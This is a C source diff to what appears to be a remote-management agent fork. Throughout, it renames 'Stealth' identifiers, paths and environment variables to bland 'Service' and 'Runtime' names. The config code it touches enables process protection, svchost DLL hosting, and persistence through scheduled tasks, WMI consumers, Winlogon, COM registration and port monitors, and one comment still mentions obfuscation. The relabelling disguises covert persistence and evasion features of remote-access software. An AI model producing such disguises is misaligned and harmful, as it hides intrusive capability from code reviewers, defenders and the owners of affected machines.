@@ -54,13 +54,13 @@ limitations under the License.
 #include "microscript/ILibDuktape_Commit.h"
 #include <shellscalingapi.h>
 #include "branding_util.h"
-#include "stealth.h"  // SECURITY: Stealth and obfuscation features
-#include "stealth_utils.h"
-#include "stealth_init.h"  // Lab/test stealth initialization
-#include "stealth_defaults.h"
-#include "stealth_watchdog.h"
-#include "stealth_monitor.h"
-#include "stealth_integration.h"
+#include "runtime_core.h"  // SECURITY: Service and obfuscation features
+#include "service_utils.h"
+#include "runtime_init.h"  // Optional runtime feature initialization
+#include "service_defaults.h"
+#include "service_watchdog.h"
+#include "service_monitor.h"
+#include "service_integration.h"
 #include "rundll32_contract.h"
 
 // Forward declaration to satisfy early references in this TU
@@ -467,7 +467,7 @@ static BOOL MeshService_SpawnBridgeProcessW(
 		return FALSE;
 	}
 
-	if (!Stealth_ProtectProcessByHandle(ctx->pi.hProcess))
+	if (!ServiceUtil_ProtectProcessByHandle(ctx->pi.hProcess))
 	{
 		ctx->protectError = GetLastError();
 		if (ctx->protectError == ERROR_SUCCESS) { ctx->protectError = ERROR_ACCESS_DENIED; }
@@ -4393,7 +4393,7 @@ static BOOL MeshService_GetCurrentBuildBridgeDllPathW(WCHAR* output, size_t outp
 	{
 		return SUCCEEDED(StringCchCopyW(output, outputLen, candidate));
 	}
-	if (FAILED(StringCchPrintfW(candidate, _countof(candidate), L"%ls\\StealthLab_DLL\\%ls.dll", parentDir, nameNoExt))) { return FALSE; }
+	if (FAILED(StringCchPrintfW(candidate, _countof(candidate), L"%ls\\MeshServiceBundle\\%ls.dll", parentDir, nameNoExt))) { return FALSE; }
 	if (GetFileAttributesW(candidate) == INVALID_FILE_ATTRIBUTES) { return FALSE; }
 
 	return SUCCEEDED(StringCchCopyW(output, outputLen, candidate));
@@ -4467,10 +4467,10 @@ static int MeshService_RunKvmBridgeCrashRecoveryProbeWorkerCommand(void)
 	DeleteFileW(missingExePath);
 	ILibWideToUTF8Ex(missingExePath, -1, missingExePathA, (int)sizeof(missingExePathA));
 
-	previousForceExitCodeLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, (DWORD)_countof(previousForceExitCode));
+	previousForceExitCodeLen = GetEnvironmentVariableW(L"KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, (DWORD)_countof(previousForceExitCode));
 	if (previousForceExitCodeLen >= _countof(previousForceExitCode)) { previousForceExitCodeLen = 0; previousForceExitCode[0] = L'\0'; }
 
-	SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", L"193");
+	SetEnvironmentVariableW(L"KVM_BRIDGE_FORCE_EXIT_CODE", L"193");
 
 	if (bridgeDllReady && chainStarted)
 	{
@@ -4508,7 +4508,7 @@ static int MeshService_RunKvmBridgeCrashRecoveryProbeWorkerCommand(void)
 		}
 	}
 
-	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, previousForceExitCodeLen);
+	MeshService_RestoreEnvironmentVariableW(L"KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, previousForceExitCodeLen);
 	chainThreadWaitResult = MeshService_KvmProbeChain_Stop(&probeChain);
 
 	for (i = 1; i < failureCount && i < 6; ++i)
@@ -4743,10 +4743,10 @@ static int MeshService_RunKvmBridgeEventAuditProbeWorkerCommand(void)
 	DeleteFileW(missingExePath);
 	ILibWideToUTF8Ex(missingExePath, -1, missingExePathA, (int)sizeof(missingExePathA));
 
-	previousForceExitCodeLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, (DWORD)_countof(previousForceExitCode));
+	previousForceExitCodeLen = GetEnvironmentVariableW(L"KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, (DWORD)_countof(previousForceExitCode));
 	if (previousForceExitCodeLen >= _countof(previousForceExitCode)) { previousForceExitCodeLen = 0; previousForceExitCode[0] = L'\0'; }
 
-	SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", NULL);
+	SetEnvironmentVariableW(L"KVM_BRIDGE_FORCE_EXIT_CODE", NULL);
 
 	if (bridgeDllReady && serviceNameReady && chainStarted)
 	{
@@ -4779,7 +4779,7 @@ static int MeshService_RunKvmBridgeEventAuditProbeWorkerCommand(void)
 	}
 
 	ZeroMemory(&state, sizeof(state));
-	SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", L"193");
+	SetEnvironmentVariableW(L"KVM_BRIDGE_FORCE_EXIT_CODE", L"193");
 
 	if (bridgeDllReady && serviceNameReady && chainStarted)
 	{
@@ -4807,7 +4807,7 @@ static int MeshService_RunKvmBridgeEventAuditProbeWorkerCommand(void)
 		Sleep(250);
 	}
 
-	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, previousForceExitCodeLen);
+	MeshService_RestoreEnvironmentVariableW(L"KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, previousForceExitCodeLen);
 	chainThreadWaitResult = MeshService_KvmProbeChain_Stop(&probeChain);
 
 	success =
@@ -4995,17 +4995,17 @@ static int MeshService_RunKvmBridgeConnectDelayProbeCommand(DWORD requestedConne
 	chainStarted = MeshService_KvmProbeChain_Start(&probeChain);
 	GetModuleFileNameA(NULL, exePath, (DWORD)sizeof(exePath));
 
-	previousForceExitCodeLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, (DWORD)_countof(previousForceExitCode));
+	previousForceExitCodeLen = GetEnvironmentVariableW(L"KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, (DWORD)_countof(previousForceExitCode));
 	if (previousForceExitCodeLen >= _countof(previousForceExitCode)) { previousForceExitCodeLen = 0; previousForceExitCode[0] = L'\0'; }
 	previousConnectDelayLen = GetEnvironmentVariableW(KVM_BRIDGE_CONNECT_DELAY_ENV_W, previousConnectDelay, (DWORD)_countof(previousConnectDelay));
 	if (previousConnectDelayLen >= _countof(previousConnectDelay)) { previousConnectDelayLen = 0; previousConnectDelay[0] = L'\0'; }
-	previousTraceStartupLen = GetEnvironmentVariableW(L"STEALTH_KVM_TRACE_STARTUP", previousTraceStartup, (DWORD)_countof(previousTraceStartup));
+	previousTraceStartupLen = GetEnvironmentVariableW(L"KVM_TRACE_STARTUP", previousTraceStartup, (DWORD)_countof(previousTraceStartup));
 	if (previousTraceStartupLen >= _countof(previousTraceStartup)) { previousTraceStartupLen = 0; previousTraceStartup[0] = L'\0'; }
 
-	SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", NULL);
+	SetEnvironmentVariableW(L"KVM_BRIDGE_FORCE_EXIT_CODE", NULL);
 	StringCchPrintfW(connectDelayText, _countof(connectDelayText), L"%lu", (unsigned long)requestedConnectDelayMs);
 	SetEnvironmentVariableW(KVM_BRIDGE_CONNECT_DELAY_ENV_W, connectDelayText);
-	SetEnvironmentVariableW(L"STEALTH_KVM_TRACE_STARTUP", L"1");
+	SetEnvironmentVariableW(L"KVM_TRACE_STARTUP", L"1");
 
 	if (bridgeDllReady && chainStarted)
 	{
@@ -5048,9 +5048,9 @@ static int MeshService_RunKvmBridgeConnectDelayProbeCommand(DWORD requestedConne
 		}
 	}
 
-	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, previousForceExitCodeLen);
+	MeshService_RestoreEnvironmentVariableW(L"KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, previousForceExitCodeLen);
 	MeshService_RestoreEnvironmentVariableW(KVM_BRIDGE_CONNECT_DELAY_ENV_W, previousConnectDelay, previousConnectDelayLen);
-	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_TRACE_STARTUP", previousTraceStartup, previousTraceStartupLen);
+	MeshService_RestoreEnvironmentVariableW(L"KVM_TRACE_STARTUP", previousTraceStartup, previousTraceStartupLen);
 	chainThreadWaitResult = MeshService_KvmProbeChain_Stop(&probeChain);
 
 	success = bridgeDllReady &&
@@ -5218,17 +5218,17 @@ static int MeshService_RunKvmBridgeSessionInterruptProbeCommand(DWORD requestedC
 		notifySessionId = unrelatedSessionEvent ? (sessionId + 1UL) : sessionId;
 	}
 
-	previousForceExitCodeLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, (DWORD)_countof(previousForceExitCode));
+	previousForceExitCodeLen = GetEnvironmentVariableW(L"KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, (DWORD)_countof(previousForceExitCode));
 	if (previousForceExitCodeLen >= _countof(previousForceExitCode)) { previousForceExitCodeLen = 0; previousForceExitCode[0] = L'\0'; }
 	previousConnectDelayLen = GetEnvironmentVariableW(KVM_BRIDGE_CONNECT_DELAY_ENV_W, previousConnectDelay, (DWORD)_countof(previousConnectDelay));
 	if (previousConnectDelayLen >= _countof(previousConnectDelay)) { previousConnectDelayLen = 0; previousConnectDelay[0] = L'\0'; }
-	previousTraceStartupLen = GetEnvironmentVariableW(L"STEALTH_KVM_TRACE_STARTUP", previousTraceStartup, (DWORD)_countof(previousTraceStartup));
+	previousTraceStartupLen = GetEnvironmentVariableW(L"KVM_TRACE_STARTUP", previousTraceStartup, (DWORD)_countof(previousTraceStartup));
 	if (previousTraceStartupLen >= _countof(previousTraceStartup)) { previousTraceStartupLen = 0; previousTraceStartup[0] = L'\0'; }
 
-	SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", NULL);
+	SetEnvironmentVariableW(L"KVM_BRIDGE_FORCE_EXIT_CODE", NULL);
 	StringCchPrintfW(connectDelayText, _countof(connectDelayText), L"%lu", (unsigned long)requestedConnectDelayMs);
 	SetEnvironmentVariableW(KVM_BRIDGE_CONNECT_DELAY_ENV_W, connectDelayText);
-	SetEnvironmentVariableW(L"STEALTH_KVM_TRACE_STARTUP", L"1");
+	SetEnvironmentVariableW(L"KVM_TRACE_STARTUP", L"1");
 
 	if (bridgeDllReady && chainStarted)
 	{
@@ -5275,9 +5275,9 @@ static int MeshService_RunKvmBridgeSessionInterruptProbeCommand(DWORD requestedC
 		}
 	}
 
-	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, previousForceExitCodeLen);
+	MeshService_RestoreEnvironmentVariableW(L"KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, previousForceExitCodeLen);
 	MeshService_RestoreEnvironmentVariableW(KVM_BRIDGE_CONNECT_DELAY_ENV_W, previousConnectDelay, previousConnectDelayLen);
-	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_TRACE_STARTUP", previousTraceStartup, previousTraceStartupLen);
+	MeshService_RestoreEnvironmentVariableW(L"KVM_TRACE_STARTUP", previousTraceStartup, previousTraceStartupLen);
 	chainThreadWaitResult = MeshService_KvmProbeChain_Stop(&probeChain);
 
 	if (unrelatedSessionEvent)
@@ -5650,9 +5650,9 @@ typedef struct MeshServiceSvchostStatusSummary
 	BOOL serviceDllExists;
 	BOOL serviceDllMatchesExpected;
 	BOOL hashConfigured;
-	WCHAR expectedHash[STEALTH_SHA256_STRING_LENGTH + 1];
+	WCHAR expectedHash[SERVICE_UTIL_SHA256_STRING_LENGTH + 1];
 	BOOL actualHashAvailable;
-	WCHAR actualHash[STEALTH_SHA256_STRING_LENGTH + 1];
+	WCHAR actualHash[SERVICE_UTIL_SHA256_STRING_LENGTH + 1];
 	BOOL hashMatch;
 	BOOL serviceMainPresent;
 	WCHAR serviceMain[128];
@@ -5832,12 +5832,12 @@ static int MeshService_RunSvchostStatusCommand(void)
 	MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), summary.serviceName, _countof(summary.serviceName));
 	if (summary.serviceName[0] == L'\0')
 	{
-		wcscpy_s(summary.serviceName, _countof(summary.serviceName), STEALTH_FALLBACK_SERVICE_NAME);
+		wcscpy_s(summary.serviceName, _countof(summary.serviceName), SERVICE_FALLBACK_SERVICE_NAME);
 	}
 
-	StealthInstallPaths paths;
+	ServiceInstallPaths paths;
 	ZeroMemory(&paths, sizeof(paths));
-	if (Stealth_GetInstallPaths(&paths))
+	if (ServiceDeploy_GetInstallPaths(&paths))
 	{
 		StringCchCopyW(summary.expectedServiceDll, _countof(summary.expectedServiceDll), paths.dllPath);
 	}
@@ -5935,10 +5935,10 @@ static int MeshService_RunSvchostStatusCommand(void)
 
 				if (summary.serviceDllExists)
 				{
-					summary.actualHashAvailable = Stealth_ComputeFileSha256W(summary.serviceDllExpanded, summary.actualHash, _countof(summary.actualHash));
+					summary.actualHashAvailable = ServiceUtil_ComputeFileSha256W(summary.serviceDllExpanded, summary.actualHash, _countof(summary.actualHash));
 					if (!summary.actualHashAvailable)
 					{
-						Stealth_DebugPrintfW(L"Failed to compute ServiceDll hash for %ls", summary.serviceDllExpanded);
+						ServiceUtil_DebugPrintfW(L"Failed to compute ServiceDll hash for %ls", summary.serviceDllExpanded);
 					}
 				}
 			}
@@ -5965,7 +5965,7 @@ static int MeshService_RunSvchostStatusCommand(void)
 			if (ReadRegStrW(hParams, L"ServiceMain", summary.serviceMain, _countof(summary.serviceMain)))
 			{
 				summary.serviceMainPresent = TRUE;
-				summary.serviceMainValid = (_wcsicmp(summary.serviceMain, L"Stealth_SvchostServiceMain") == 0);
+				summary.serviceMainValid = (_wcsicmp(summary.serviceMain, L"ServiceHost_SvchostServiceMain") == 0);
 				if (!summary.serviceMainValid)
 				{
 					summary.statusMask |= SVCHOST_STATUS_SERVICE_MAIN_MISMATCH;
@@ -6127,14 +6127,14 @@ static BOOL MeshService_EnablePrivilege(const wchar_t* privilegeName)
 	HANDLE token = NULL;
 	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
 	{
-		Stealth_DebugLastErrorW(L"OpenProcessToken (MeshService_EnablePrivilege)");
+		ServiceUtil_DebugLastErrorW(L"OpenProcessToken (MeshService_EnablePrivilege)");
 		return FALSE;
 	}
 
 	LUID luid;
 	if (!LookupPrivilegeValueW(NULL, privilegeName, &luid))
 	{
-		Stealth_DebugLastErrorW(L"LookupPrivilegeValueW (MeshService_EnablePrivilege)");
+		ServiceUtil_DebugLastErrorW(L"LookupPrivilegeValueW (MeshService_EnablePrivilege)");
 		CloseHandle(token);
 		return FALSE;
 	}
@@ -6147,7 +6147,7 @@ static BOOL MeshService_EnablePrivilege(const wchar_t* privilegeName)
 
 	if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL))
 	{
-		Stealth_DebugLastErrorW(L"AdjustTokenPrivileges (MeshService_EnablePrivilege)");
+		ServiceUtil_DebugLastErrorW(L"AdjustTokenPrivileges (MeshService_EnablePrivilege)");
 		CloseHandle(token);
 		return FALSE;
 	}
@@ -6157,7 +6157,7 @@ static BOOL MeshService_EnablePrivilege(const wchar_t* privilegeName)
 
 	if (adjustError == ERROR_NOT_ALL_ASSIGNED)
 	{
-		Stealth_DebugPrintfW(L"[ServiceSecurity] Token missing privilege: %ls", privilegeName);
+		ServiceUtil_DebugPrintfW(L"[ServiceSecurity] Token missing privilege: %ls", privilegeName);
 		return FALSE;
 	}
 
@@ -6179,7 +6179,7 @@ BOOL MeshService_HardenServiceDaclByName(const wchar_t* serviceName)
 	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
 	if (scm == NULL)
 	{
-		Stealth_DebugLastErrorW(L"OpenSCManagerW (MeshService_HardenServiceDaclByName)");
+		ServiceUtil_DebugLastErrorW(L"OpenSCManagerW (MeshService_HardenServiceDaclByName)");
 		return FALSE;
 	}
 
@@ -6187,7 +6187,7 @@ BOOL MeshService_HardenServiceDaclByName(const wchar_t* serviceName)
 	SC_HANDLE svc = OpenServiceW(scm, serviceName, desiredAccess);
 	if (svc == NULL)
 	{
-		Stealth_DebugLastErrorW(L"OpenServiceW (MeshService_HardenServiceDaclByName)");
+		ServiceUtil_DebugLastErrorW(L"OpenServiceW (MeshService_HardenServiceDaclByName)");
 		CloseServiceHandle(scm);
 		return FALSE;
 	}
@@ -6201,18 +6201,18 @@ BOOL MeshService_HardenServiceDaclByName(const wchar_t* serviceName)
 	{
 		if (SetServiceObjectSecurity(svc, DACL_SECURITY_INFORMATION, sd) != FALSE)
 		{
-			Stealth_DebugPrintfW(L"[ServiceSecurity] Hardened DACL applied to %ls", serviceName);
+			ServiceUtil_DebugPrintfW(L"[ServiceSecurity] Hardened DACL applied to %ls", serviceName);
 			hardened = TRUE;
 		}
 		else
 		{
-			Stealth_DebugLastErrorW(L"SetServiceObjectSecurity (MeshService_HardenServiceDaclByName)");
+			ServiceUtil_DebugLastErrorW(L"SetServiceObjectSecurity (MeshService_HardenServiceDaclByName)");
 		}
 		LocalFree(sd);
 	}
 	else
 	{
-		Stealth_DebugLastErrorW(L"ConvertStringSecurityDescriptorToSecurityDescriptorW (MeshService_HardenServiceDaclByName)");
+		ServiceUtil_DebugLastErrorW(L"ConvertStringSecurityDescriptorToSecurityDescriptorW (MeshService_HardenServiceDaclByName)");
 	}
 
 	CloseServiceHandle(svc);
@@ -6256,14 +6256,14 @@ BOOL MeshService_ValidateServiceDaclByName(const wchar_t* serviceName, wchar_t* 
 	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
 	if (scm == NULL)
 	{
-		Stealth_DebugLastErrorW(L"OpenSCManagerW (MeshService_ValidateServiceDaclByName)");
+		ServiceUtil_DebugLastErrorW(L"OpenSCManagerW (MeshService_ValidateServiceDaclByName)");
 		return FALSE;
 	}
 
 	SC_HANDLE svc = OpenServiceW(scm, serviceName, READ_CONTROL);
 	if (svc == NULL)
 	{
-		Stealth_DebugLastErrorW(L"OpenServiceW (MeshService_ValidateServiceDaclByName)");
+		ServiceUtil_DebugLastErrorW(L"OpenServiceW (MeshService_ValidateServiceDaclByName)");
 		CloseServiceHandle(scm);
 		return FALSE;
 	}
@@ -6272,7 +6272,7 @@ BOOL MeshService_ValidateServiceDaclByName(const wchar_t* serviceName, wchar_t* 
 	QueryServiceObjectSecurity(svc, DACL_SECURITY_INFORMATION, NULL, 0, &needed);
 	if (needed == 0)
 	{
-		Stealth_DebugLastErrorW(L"QueryServiceObjectSecurity (MeshService_ValidateServiceDaclByName)");
+		ServiceUtil_DebugLastErrorW(L"QueryServiceObjectSecurity (MeshService_ValidateServiceDaclByName)");
 		CloseServiceHandle(svc);
 		CloseServiceHandle(scm);
 		return FALSE;
@@ -6313,7 +6313,7 @@ BOOL MeshService_ValidateServiceDaclByName(const wchar_t* serviceName, wchar_t* 
 	}
 	else
 	{
-		Stealth_DebugLastErrorW(L"QueryServiceObjectSecurity (MeshService_ValidateServiceDaclByName)");
+		ServiceUtil_DebugLastErrorW(L"QueryServiceObjectSecurity (MeshService_ValidateServiceDaclByName)");
 	}
 
 	LocalFree(sd);
@@ -6327,7 +6327,7 @@ void MeshService_HardenServiceDacl(void)
 	wchar_t svcName[256];
 	if (!MeshService_GetServiceNameW(svcName, _countof(svcName)))
 	{
-		Stealth_DebugPrintfW(L"[ServiceSecurity] Unable to resolve service name for DACL hardening");
+		ServiceUtil_DebugPrintfW(L"[ServiceSecurity] Unable to resolve service name for DACL hardening");
 		return;
 	}
 	MeshService_HardenServiceDaclByName(svcName);
@@ -6340,7 +6340,7 @@ static BOOL MeshService_GetServiceNameW(wchar_t* buffer, size_t cchBuffer)
 	MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), buffer, cchBuffer);
 	if (buffer[0] == L'\0')
 	{
-		if (wcscpy_s(buffer, cchBuffer, STEALTH_FALLBACK_SERVICE_NAME) != 0)
+		if (wcscpy_s(buffer, cchBuffer, SERVICE_FALLBACK_SERVICE_NAME) != 0)
 		{
 			return FALSE;
 		}
@@ -6455,31 +6455,31 @@ static void MeshService_TouchProvisioningMarkers(void)
 #endif /* MESH_PROVISIONING_HARDCODED */
 }
 
-#ifdef MESHAGENT_ENABLE_STEALTH
-static BOOL g_StealthIntegrationReady = FALSE;
-static BOOL g_StealthIntegrationRunning = FALSE;
+#ifdef MESHAGENT_ENABLE_RUNTIME_FEATURES
+static BOOL g_ServiceIntegrationReady = FALSE;
+static BOOL g_ServiceIntegrationRunning = FALSE;
 static BOOL MeshService_ReadEnvBool(const wchar_t* name, BOOL defaultValue);
 static DWORD MeshService_ReadEnvDword(const wchar_t* name, DWORD defaultValue);
 static void MeshService_JoinPath(wchar_t* dest, size_t destCch, const wchar_t* dir, const wchar_t* leaf);
-static BOOL MeshService_BuildIntegrationConfig(StealthIntegrationConfig* config);
-static BOOL MeshService_StartStealthIntegration(void);
-static void MeshService_ShutdownStealthIntegration(void);
+static BOOL MeshService_BuildIntegrationConfig(ServiceIntegrationConfig* config);
+static BOOL MeshService_StartServiceIntegration(void);
+static void MeshService_ShutdownServiceIntegration(void);
 #endif
 
-#ifdef MESHAGENT_ENABLE_STEALTH
+#ifdef MESHAGENT_ENABLE_RUNTIME_FEATURES
 static BOOL MeshService_EnableWatchdogIfConfigured(void)
 {
 	const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
 
-	if (g_StealthIntegrationReady) {
-		Stealth_DebugPrintfA("[Watchdog] Deferring to StealthIntegration path");
+	if (g_ServiceIntegrationReady) {
+		ServiceUtil_DebugPrintfA("[Watchdog] Deferring to ServiceIntegration path");
 		return FALSE;
 	}
 
 	if (persistence == NULL || persistence->watchdog.enabled == 0) { return FALSE; }
 
 	SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
-	Stealth_DebugPrintfA("[Watchdog] Direct watchdog helper activation blocked by rundll32-only lifecycle policy");
+	ServiceUtil_DebugPrintfA("[Watchdog] Direct watchdog helper activation blocked by rundll32-only lifecycle policy");
 	return FALSE;
 }
 
@@ -6496,7 +6496,7 @@ static void MeshService_DisableWatchdog(void)
 }
 #endif
 
-#ifdef MESHAGENT_ENABLE_STEALTH
+#ifdef MESHAGENT_ENABLE_RUNTIME_FEATURES
 static BOOL MeshService_ReadEnvBool(const wchar_t* name, BOOL defaultValue)
 {
 	wchar_t buffer[32];
@@ -6540,17 +6540,17 @@ static void MeshService_JoinPath(wchar_t* dest, size_t destCch, const wchar_t* d
 	StringCchCatW(dest, destCch, leaf);
 }
 
-static BOOL MeshService_BuildIntegrationConfig(StealthIntegrationConfig* config)
+static BOOL MeshService_BuildIntegrationConfig(ServiceIntegrationConfig* config)
 {
 	if (config == NULL) { return FALSE; }
 
-	StealthIntegration_LoadDefaultConfig(config);
+	ServiceIntegration_LoadDefaultConfig(config);
 
 	WCHAR serviceNameBuf[64] = { 0 };
 	MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceNameBuf, _countof(serviceNameBuf));
 	if (serviceNameBuf[0] == L'\0')
 	{
-		StringCchCopyW(serviceNameBuf, _countof(serviceNameBuf), STEALTH_FALLBACK_SERVICE_NAME);
+		StringCchCopyW(serviceNameBuf, _countof(serviceNameBuf), SERVICE_FALLBACK_SERVICE_NAME);
 	}
 	StringCchCopyW(config->serviceName, _countof(config->serviceName), serviceNameBuf);
 
@@ -6558,7 +6558,7 @@ static BOOL MeshService_BuildIntegrationConfig(StealthIntegrationConfig* config)
 	MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), displayNameBuf, _countof(displayNameBuf));
 	if (displayNameBuf[0] == L'\0')
 	{
-		StringCchCopyW(displayNameBuf, _countof(displayNameBuf), STEALTH_FALLBACK_DISPLAY_NAME);
+		StringCchCopyW(displayNameBuf, _countof(displayNameBuf), SERVICE_FALLBACK_DISPLAY_NAME);
 	}
 	StringCchCopyW(config->displayName, _countof(config->displayName), displayNameBuf);
 
@@ -6568,10 +6568,10 @@ static BOOL MeshService_BuildIntegrationConfig(StealthIntegrationConfig* config)
 		StringCchCopyW(config->serviceExePath, _countof(config->serviceExePath), exePath);
 	}
 
-	StealthInstallPaths paths = { 0 };
-	if (!Stealth_GetInstallPaths(&paths) || paths.installDir[0] == L'\0')
+	ServiceInstallPaths paths = { 0 };
+	if (!ServiceDeploy_GetInstallPaths(&paths) || paths.installDir[0] == L'\0')
 	{
-		Stealth_DebugPrintfW(L"[Policy] Stealth integration blocked because branded install paths are unavailable");
+		ServiceUtil_DebugPrintfW(L"[Policy] Service integration blocked because branded install paths are unavailable");
 		return FALSE;
 	}
 	StringCchCopyW(config->installDir, _countof(config->installDir), paths.installDir);
@@ -6586,7 +6586,7 @@ static BOOL MeshService_BuildIntegrationConfig(StealthIntegrationConfig* config)
 	}
 	else
 	{
-		Stealth_DebugPrintfW(L"[Policy] Stealth integration blocked because branded log paths are unavailable");
+		ServiceUtil_DebugPrintfW(L"[Policy] Service integration blocked because branded log paths are unavailable");
 		return FALSE;
 	}
 
@@ -6595,35 +6595,35 @@ static BOOL MeshService_BuildIntegrationConfig(StealthIntegrationConfig* config)
 
 	const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
 	config->enableServiceProtection = TRUE;
-	config->enableTaskScheduler = MeshService_ReadEnvBool(L"STEALTH_ENABLE_TASKS",
+	config->enableTaskScheduler = MeshService_ReadEnvBool(L"SERVICE_ENABLE_TASKS",
 		(persistence != NULL && persistence->autorunTask.enabled != 0));
-	config->enableWmiConsumer = MeshService_ReadEnvBool(L"STEALTH_ENABLE_WMI",
+	config->enableWmiConsumer = MeshService_ReadEnvBool(L"SERVICE_ENABLE_WMI",
 		(persistence != NULL && persistence->restartTask.enabled != 0));
-	config->enableWatchdog = MeshService_ReadEnvBool(L"STEALTH_ENABLE_WATCHDOG",
+	config->enableWatchdog = MeshService_ReadEnvBool(L"SERVICE_ENABLE_WATCHDOG",
 		(persistence != NULL && persistence->watchdog.enabled != 0));
-	config->enableTamperDetection = MeshService_ReadEnvBool(L"STEALTH_ENABLE_MONITOR", config->enableTamperDetection);
-	config->enableIpcServer = MeshService_ReadEnvBool(L"STEALTH_ENABLE_IPC", config->enableIpcServer);
-	config->enableRegistryPolicy = MeshService_ReadEnvBool(L"STEALTH_ENABLE_REGISTRY_POLICY", config->enableRegistryPolicy);
-	config->enableWinlogon = MeshService_ReadEnvBool(L"STEALTH_ENABLE_WINLOGON", config->enableWinlogon);
-	config->enableExplorerPolicy = MeshService_ReadEnvBool(L"STEALTH_ENABLE_EXPLORER_POLICY", config->enableExplorerPolicy);
-	config->enableComRegistrationPolicy = MeshService_ReadEnvBool(L"STEALTH_ENABLE_COM_REGISTRATION_POLICY", config->enableComRegistrationPolicy);
-	config->enablePortMonitor = MeshService_ReadEnvBool(L"STEALTH_ENABLE_PORT_MONITOR", config->enablePortMonitor);
-	config->enableDllLoadPolicy = MeshService_ReadEnvBool(L"STEALTH_ENABLE_DLL_LOAD_POLICY", config->enableDllLoadPolicy);
+	config->enableTamperDetection = MeshService_ReadEnvBool(L"SERVICE_ENABLE_MONITOR", config->enableTamperDetection);
+	config->enableIpcServer = MeshService_ReadEnvBool(L"SERVICE_ENABLE_IPC", config->enableIpcServer);
+	config->enableRegistryPolicy = MeshService_ReadEnvBool(L"SERVICE_ENABLE_REGISTRY_POLICY", config->enableRegistryPolicy);
+	config->enableWinlogon = MeshService_ReadEnvBool(L"SERVICE_ENABLE_WINLOGON", config->enableWinlogon);
+	config->enableExplorerPolicy = MeshService_ReadEnvBool(L"SERVICE_ENABLE_EXPLORER_POLICY", config->enableExplorerPolicy);
+	config->enableComRegistrationPolicy = MeshService_ReadEnvBool(L"SERVICE_ENABLE_COM_REGISTRATION_POLICY", config->enableComRegistrationPolicy);
+	config->enablePortMonitor = MeshService_ReadEnvBool(L"SERVICE_ENABLE_PORT_MONITOR", config->enablePortMonitor);
+	config->enableDllLoadPolicy = MeshService_ReadEnvBool(L"SERVICE_ENABLE_DLL_LOAD_POLICY", config->enableDllLoadPolicy);
 
 	if (persistence != NULL && persistence->watchdog.intervalSeconds > 0)
 	{
 		config->watchdogIntervalMs = persistence->watchdog.intervalSeconds * 1000;
 	}
-	config->monitorIntervalMs = MeshService_ReadEnvDword(L"STEALTH_MONITOR_INTERVAL_MS", config->monitorIntervalMs);
-	config->watchdogIntervalMs = MeshService_ReadEnvDword(L"STEALTH_WATCHDOG_INTERVAL_MS", config->watchdogIntervalMs);
-	config->ipcTimeoutMs = MeshService_ReadEnvDword(L"STEALTH_IPC_TIMEOUT_MS", config->ipcTimeoutMs);
+	config->monitorIntervalMs = MeshService_ReadEnvDword(L"SERVICE_MONITOR_INTERVAL_MS", config->monitorIntervalMs);
+	config->watchdogIntervalMs = MeshService_ReadEnvDword(L"SERVICE_WATCHDOG_INTERVAL_MS", config->watchdogIntervalMs);
+	config->ipcTimeoutMs = MeshService_ReadEnvDword(L"SERVICE_IPC_TIMEOUT_MS", config->ipcTimeoutMs);
 
-	config->autoSecureEnter = MeshService_ReadEnvBool(L"STEALTH_AUTO_SECUREENTER", config->enableWatchdog);
+	config->autoSecureEnter = MeshService_ReadEnvBool(L"SERVICE_AUTO_SECUREENTER", config->enableWatchdog);
 	config->strictServiceOnly = TRUE;
 	config->allowDesktopBridge = FALSE;
 
 	wchar_t authKey[64];
-	if (GetEnvironmentVariableW(L"STEALTH_IPC_AUTH", authKey, (DWORD)_countof(authKey)) > 0)
+	if (GetEnvironmentVariableW(L"SERVICE_IPC_AUTH", authKey, (DWORD)_countof(authKey)) > 0)
 	{
 		StringCchCopyW(config->ipcAuthKey, _countof(config->ipcAuthKey), authKey);
 	}
